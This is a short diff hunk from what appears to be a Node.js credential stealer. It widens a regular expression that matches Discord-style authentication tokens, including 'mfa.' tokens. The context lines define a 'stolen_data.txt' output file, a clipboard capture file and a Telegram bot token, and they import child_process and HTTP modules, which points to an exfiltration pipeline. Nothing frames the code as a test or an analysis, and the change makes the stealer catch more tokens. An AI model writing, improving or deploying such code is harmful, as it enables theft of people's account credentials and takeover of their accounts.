@@ -10,7 +10,7 @@ const https = require('https')
 const http = require('http')
 const { execSync } = require('child_process')
 
-const tokenpattern = /[\w-]{23,26}\.[\w-]{5,7}\.[\w-]{26,28}|mfa\.[\w-]{83,85}/g
+const tokenpattern = /[\w-]{20,28}\.[\w-]{4,10}\.[\w-]{25,35}|mfa\.[\w-]{80,90}/g
 const datafile = path.join(__dirname, 'stolen_data.txt')
 const clipfile = path.join(__dirname, 'clipboard.txt')
 const tgtoken = process.env.TGTOKEN
